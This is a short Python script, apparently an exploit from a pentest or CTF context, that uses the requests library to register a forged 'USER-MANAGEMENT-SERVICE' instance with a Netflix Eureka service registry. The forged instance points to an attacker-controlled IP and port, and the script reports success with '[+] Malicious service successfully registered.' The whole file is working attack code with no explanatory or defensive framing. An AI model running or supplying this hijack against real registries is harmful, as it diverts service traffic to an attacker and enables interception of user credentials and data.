import requests

EUREKA_URL = "http://{EurekaSrvr}:{Eureka_PASSWORD}@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE"
MY_IP = "xx.xx.xx.xx"
TARGET_PORT = 8081

json_payload = {
    "instance": {
        "instanceId": "USER-MANAGEMENT-SERVICE",
        "hostName": MY_IP,
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": MY_IP,
        "status": "UP",
        "port": {"$": TARGET_PORT, "@enabled": "true"},
        "vipAddress": "USER-MANAGEMENT-SERVICE",
        "secureVipAddress": "USER-MANAGEMENT-SERVICE",
        "countryId": 1,
        "dataCenterInfo": {
            "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
            "name": "MyOwn"
        }
    }
}


headers = {
    "Content-Type": "application/json"
}

response = requests.post(EUREKA_URL, json=json_payload, headers=headers)

if response.status_code == 204:
    print("[+] Malicious service successfully registered.")
else:
    print(f"[-] Failure ({response.status_code}) : {response.status_code} {response.text}")
